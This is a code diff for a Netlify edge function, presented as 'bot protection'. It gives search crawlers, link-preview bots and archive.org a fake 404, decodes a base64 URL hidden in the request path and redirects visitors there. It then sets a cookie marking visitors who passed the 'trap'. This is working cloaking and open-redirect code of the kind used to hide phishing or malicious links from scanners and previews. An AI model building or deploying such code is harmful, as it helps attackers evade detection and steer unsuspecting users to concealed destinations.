@@ -1,44 +1,78 @@
-// netlify/edge-functions/protect-and-redirect.js
-
 export default async (request, context) => {
+  const url = new URL(request.url);
   const userAgent = request.headers.get("user-agent") || "";
   const clientIP = context.ip;
-  const url = new URL(request.url);
+  const cookies = request.headers.get("cookie") || "";
 
-  // 1. Bot User-Agents to block (Extracted from your list)
+  // Helper function to serve your fake 404 HTML
+  const serveFake404 = async () => {
+    try {
+      const response = await fetch(new URL("/index.html", request.url));
+      const html = await response.text();
+      return new Response(html, {
+        status: 404,
+        headers: { "Content-Type": "text/html" }
+      });
+    } catch (err) {
+      return new Response("Not Found", { status: 404 });
+    }
+  };
+
+  // 1. EXTRACT BASE64 DATA (e.g., from /.aHR0c...)
+  const pathParts = url.pathname.split(".");
+  const base64Data = pathParts.length > 1 ? pathParts[pathParts.length - 1] : null;
+
+  // 2. BOT PROTECTION LIST
   const blockedAgents = [
-    "googlebot", "BlackWidow", "ChinaClaw", "Custo", "DISCo", "Download Demon",
-    "eCatch", "EirGrabber", "EmailSiphon", "EmailWolf", "Express WebPictures",
-    "ExtractorPro", "EyeNetIE", "FlashGet", "GetRight", "GetWeb!", "Go!Zilla",
-    "Go-Ahead-Got-It", "GrabNet", "Grafula", "HMView", "HTTrack", "Indy Library"
+    "googlebot", "bingbot", "yandex", "baiduspider", "facebookexternalhit", 
+    "twitterbot", "rogerbot", "linkedinbot", "embedly", "quora link preview", 
+    "showyoubot", "outbrain", "pinterest/0.", "slackbot", "vkShare", 
+    "W3C_Validator", "redditbot", "Applebot", "WhatsApp", "flipboard", 
+    "tumblr", "bitlybot", "SkypeShell", "archive.org_bot"
   ];
 
-  const isBot = blockedAgents.some(agent => 
-    userAgent.toLowerCase().includes(agent.toLowerCase())
-  );
+  const isBot = blockedAgents.some(agent => userAgent.toLowerCase().includes(agent.toLowerCase()));
 
-  // 2. Specific IPs to block (Extracted from your htaccess)
-  const blockedIPs = [
-    "89.207.18.182", "173.194.69.147", "149.3.176.145", "66.235.156.128",
-    "173.194.69.125", "173.194.69.120", "173.0.88.2", "2.20.6.85"
-  ];
-
-  // Logic: Block if Bot or Blocked IP
-  if (isBot || blockedIPs.includes(clientIP)) {
-    console.log(`Blocked: ${clientIP} - ${userAgent}`);
-    return new Response("Access Denied", { status: 403 });
+  // 3. EXECUTE PROTECTION
+  if (isBot) {
+    return await serveFake404();
   }
 
-  // 3. Redirect to your landing page if they aren't there already
-  // Replace '/landing-page' with your actual path (e.g., '/welcome' or '/index.html')
-  if (url.pathname === "/" || url.pathname === "/index.php") {
-    return Response.redirect(new URL("/landing-page", request.url), 302);
+  // 4. HANDLE DECODING & REDIRECT
+  if (base64Data) {
+    try {
+      // Decode and handle potential URL-safe base64 issues (replacing - with + and _ with /)
+      const normalizedBase64 = base64Data.replace(/-/g, '+').replace(/_/g, '/');
+      const decodedUrl = atob(normalizedBase64);
+      
+      // Safety check: ensure it's a valid web URL
+      if (!decodedUrl.startsWith("http")) {
+        throw new Error("Invalid URL format");
+      }
+
+      const response = Response.redirect(decodedUrl, 302);
+      
+      // Set the "passed" cookie for 24 hours
+      response.headers.append(
+        "Set-Cookie", 
+        "passed_trap=true; Path=/; Max-Age=86400; HttpOnly; SameSite=Strict; Secure"
+      );
+      
+      return response;
+    } catch (e) {
+      // If decoding fails, show the fake 404
+      return await serveFake404();
+    }
   }
 
-  // Allow the request to continue if they are already on the landing page
-  return; 
+  // 5. FALLBACK (If they have the cookie, let them see the site, else show 404)
+  if (cookies.includes("passed_trap=true")) {
+    return; 
+  }
+
+  return await serveFake404();
 };
 
 export const config = {
-  path: "/*", // Run this logic on every request to the site
+  path: "/*",
 };
